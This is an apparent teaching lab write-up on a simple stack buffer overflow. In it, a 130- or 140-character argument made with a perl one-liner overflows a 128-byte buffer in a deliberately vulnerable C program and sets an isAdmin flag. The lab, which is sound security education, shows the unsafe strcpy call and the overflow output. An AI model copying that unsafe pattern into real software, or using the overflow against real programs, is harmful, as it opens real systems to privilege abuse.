# Simple Buffer overflow - local variable overwrite

## Intro

We will perform a simple buffer overflow on a binary. This overflow
will change a sensitive variable, and based on this the function flow,
which enables us to gain "admin" privileges.


## Goal

* Understand C arrays by misusing them
* Get comfortable with gdb
* Deeper understanding of the stack


## Source 

* Source directory: `~/challenges/challenge09/`
* Source files: [challenge09](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge09)

You can compile it by calling `make` in the folder `~/challenges/challenge09`


## Vulnerability

Read the source of `challenge09.c`.

The vulnerability lies here:

```
void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[128];
	...
	strcpy(firstname, username); // strcpy() is unsafe
	...
}

int main(int argc, char **argv) {
    handleData(argv[1], argv[2]);
}
```

The first argument of the program is copied into a stack buffer `name` of 128 byte size.
After this buffer `name`, an important variable called `isAdmin` is located.


## Normal behaviour

Lets execute the program with normal length string, and with a wrong password:

```
~/challenges/challenge09$ ./challenge09 sheldon password
isAdmin: 0x0
Not admin.
```

The password "password" seems to be not correct. We dont know
what the actual password is.

But with the correct password, it would look like this:

```
~/challenges/challenge09$ ./challenge09 sheldon ...
isAdmin: 0x1
You are admin!
```


## Abnormal behaviour - buffer overflow

What happens when you insert a string which is longer than 128 bytes? Lets try it.
We can use perl to print 130 characters:

```
~/challenges/challenge09$ ./challenge09 `perl -e 'print "A" x 130'` password
isAdmin: 0x4141
You are admin!
```

It appears that we have overwritten the `isAdmin` variable with the content `0x4141`. 


## Abnormal behaviour - more buffer overflow

What if we even add some more characters? Lets say 140.

```
~/challenges/challenge09$ ./challenge09 `perl -e 'print "A" x 140'` password
isAdmin: 0x41414141
You are admin!
Segmentation fault (core dumped)
```

Not only is the `isAdmin` variable `0x41414141`, but we also get a `Segmentation fault` 
at the end.


## Things to think about

* What is happening here? Why Are we "admin" if we use a username which is 130 bytes long?
* Why do we get a segmentation fault if we use a username which is 140 bytes long?

